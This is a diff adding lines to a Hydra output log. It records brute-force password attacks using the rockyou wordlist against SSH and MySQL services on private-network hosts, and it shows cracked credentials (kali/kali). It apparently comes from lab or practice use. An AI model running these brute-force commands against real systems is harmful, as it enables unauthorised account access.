@@ -19,3 +19,9 @@
 # Hydra v9.5 run at 2023-10-18 11:13:10 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:8080)
 [8080][ssh] host: 192.168.1.91   login: kali   password: kali
 # Hydra v9.5 run at 2023-10-22 13:46:00 on 192.168.1.38 mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://192.168.1.38:3306)
+# Hydra v9.5 run at 2023-10-23 20:12:27 on 192.168.1.99 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.99)
+# Hydra v9.5 run at 2023-10-23 20:13:18 on 192.168.1.99 ssh (hydra -R)
+# Hydra v9.5 run at 2023-10-24 10:48:26 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
+[22][ssh] host: 192.168.1.91   login: kali   password: kali
+# Hydra v9.5 run at 2023-10-24 10:51:18 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
+[22][ssh] host: 192.168.1.91   login: kali   password: kali
